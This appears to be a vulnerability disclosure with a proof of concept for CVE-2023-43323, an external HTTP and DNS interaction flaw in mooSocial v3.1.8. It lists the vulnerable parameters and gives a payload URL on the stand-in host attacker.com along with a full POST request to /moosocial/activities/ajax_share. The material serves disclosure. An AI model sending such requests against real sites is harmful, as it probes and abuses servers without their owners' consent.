# mooSocial: External HTTP and DNS Service Interaction (CVE-2023-43323)
mooSocial v3.1.8 is vulnerable to external service interaction on post function. When executed, the server sends a HTTP and DNS request to external server.

Vulerable Parameter: **messageText**,  **data[wall_photo]**, **data[userShareVideo]**  and **data[userShareLink]**
## Exploit - Proof of Concept (POC)

### External HTTP and DNS Service Interaction
```
Payload : http://attacker.com/?null=
```
POST Request on /moosocial/activities/ajax_share (POST REQUEST DATA ONLY): 
```
[data%5Btype%5D=User&data%5Btarget_id%5D=0&data%5Baction%5D=wall_post&data%5Bwall_photo%5D=&data%5Bsubject_type%5D=&messageText=asas&data%5BuserShareLink%5D=&data%5BuserShareVideo%5D=http%3A%2F%2Fattacker.com%2F%3Fnull&data%5BuserTagging%5D=&data%5BshareImage%5D=1&data%5Bprivacy%5D=1]
```


![image](https://github.com/ahrixia/CVE-2023-43323/assets/35935843/1f0ddaf9-8777-4b00-91e6-b66b062b817f)
